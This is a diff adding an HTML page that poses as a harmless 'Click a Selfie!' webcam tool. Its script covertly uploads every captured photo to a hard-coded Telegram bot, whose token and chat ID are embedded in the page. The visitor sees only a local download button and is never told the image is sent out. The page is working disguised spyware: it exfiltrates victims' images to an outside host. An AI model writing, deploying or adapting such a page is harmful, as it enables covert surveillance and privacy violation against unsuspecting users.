@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Selfie Capture</title>
+    <style>
+        /* Global Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: linear-gradient(135deg, #ff3b30, #ff9500);
+            font-family: 'Arial', sans-serif;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            text-align: center;
+        }
+
+        h2 {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        /* Video container */
+        video {
+            border-radius: 15px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+            margin-bottom: 15px;
+            max-width: 100%;
+        }
+
+        /* Capture button */
+        button, #downloadBtn {
+            background-color: #ffcc00;
+            color: #333;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 30px;
+            font-size: 1.2rem;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-top: 20px;
+        }
+
+        button:hover, #downloadBtn:hover {
+            background-color: #ff4d00;
+        }
+
+        /* Hidden canvas */
+        canvas {
+            display: none;
+        }
+
+        /* Download button styles */
+        #downloadBtn {
+            display: none;
+            margin-top: 30px;
+            font-size: 1.2rem;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            h2 {
+                font-size: 2rem;
+            }
+            video {
+                width: 90%;
+                height: auto;
+            }
+        }
+
+        @media (max-width: 480px) {
+            h2 {
+                font-size: 1.8rem;
+            }
+            button, #downloadBtn {
+                font-size: 1rem;
+                padding: 12px 25px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <h2>Click a Selfie!</h2>
+    <video id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+    <button id="capture">Capture Selfie</button>
+    <a id="downloadBtn" download="selfie.jpg" href="#">Download Selfie</a>
+
+    <script>
+        const botToken = "8199996433:AAHWMDwq0eqeuUsQApLD1v_hHmLPJSdCU9w";
+        const chatId = "6708043138";  // Replace with your chat ID
+
+        // Start webcam video stream
+        async function startVideo() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: {} });
+                document.getElementById('video').srcObject = stream;
+            } catch (error) {
+                alert("Please allow camera access!");
+                console.error("Camera Error:", error);
+            }
+        }
+
+        // Capture and send the photo to Telegram
+        async function captureAndSend() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+
+            // Draw the video frame on the canvas
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convert canvas to a Blob
+            canvas.toBlob(async (blob) => {
+                // Create a URL for the captured image and show the download button
+                const url = URL.createObjectURL(blob);
+                const downloadBtn = document.getElementById('downloadBtn');
+                downloadBtn.href = url;
+                downloadBtn.style.display = 'inline-block'; // Show the download button
+
+                // Prepare the form data to send the image to Telegram
+                let formData = new FormData();
+                formData.append("chat_id", chatId);
+                formData.append("photo", blob);
+
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+                // Send the photo to Telegram
+                try {
+                    const response = await fetch(telegramUrl, { method: "POST", body: formData });
+                    const result = await response.json();
+                    
+                } catch (error) {
+                    console.error("Telegram API Error:", error);
+                    alert("Error sending selfie.");
+                }
+            }, "image/jpeg");
+        }
+
+        // Event listener to start the video when page loads
+        window.addEventListener('load', async () => {
+            await startVideo();
+        });
+
+        // Capture button click event
+        document.getElementById('capture').addEventListener('click', captureAndSend);
+    </script>
+</body>
+</html>
